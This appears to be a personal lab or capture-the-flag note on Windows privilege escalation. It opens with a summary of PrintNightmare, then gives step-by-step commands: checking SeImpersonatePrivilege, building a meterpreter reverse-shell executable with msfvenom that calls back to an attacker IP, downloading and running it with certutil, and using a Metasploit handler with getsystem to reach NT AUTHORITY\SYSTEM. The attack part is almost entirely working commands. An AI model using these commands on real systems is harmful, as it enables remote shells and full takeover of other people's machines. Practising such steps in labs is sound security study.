
## Quick summary — what this is

- “PrintNightmare” refers to a class of Print Spooler vulnerabilities (notably CVE-2021-1675 and CVE-2021-34527) that allow **privilege escalation** or **remote code execution** via the Windows Print Spooler service.
    
- One attack vector uses **named pipe impersonation**: a privileged service (spoolsv.exe) can be tricked into impersonating an attacker-controlled client, leading to code execution as SYSTEM.
    
- Impact: full domain compromise on Windows domain controllers or local SYSTEM takeover on workstations/servers where spooler is running and vulnerable.

## Privileges of the current user

On the [[Initial access#Reverse Shell]] get the user's privileges.

```
whoami /priv
```

![[1_O8u40tZ_W_inoAsND5hOLQ.webp]]

The Privilege `SeImpersonatePrivilege` is enabled.

## Creating a payload with msfvenom

#Attacking_Machine 
Run the following command.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKING MACHIINE IP> LPORT=4445 -f exe -o malicious.exe
```

#SMB_shell 
## Downloading the payload

```
certutil -urlcache -f http://<ATTACKING MACHINE IP>/malicious.exe malicious.exe
```

![[Screenshot_2025-10-07_05-02-59.png]]

## Running the payload

```
.\malicious.exe
```


## Metasploit

Create a meterpreter on Metasploit.

#Attacking_Machine 
- Run `msfconsole`.

#Metasploit
- Use a **reverse shell handler** (like `multi/handler`).
```
msf6 use multi/handler
```

- Use a _persistent_ or _meterpreter_ payload.
```
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

- Set the options.
```
msf6 exploit(multi/handler) > set LHOST <ATTACKING MACHINE IP>

msf6 exploit(multi/handler) > set LPORT 4445
```

> [!Note]
LPORT is the same as the one you use to create the `malicious.exe` payload with *msfvenom*.


## Running the exploit

#Metasploit 

```
msf6 exploit(multi/handler) > exploit
```

![[Screenshot_2025-10-07_05-25-00.png]]

- Try *getsystem* to make the framework apply some common techniques.

```
meterpreter > getsystem
meterpreter > getuid
```

![[Screenshot_2025-10-07_05-30-15.png]]

> [!Success]
> You get NT AUTHORITY\SYSTEM


**Next step:** [[System flag]]
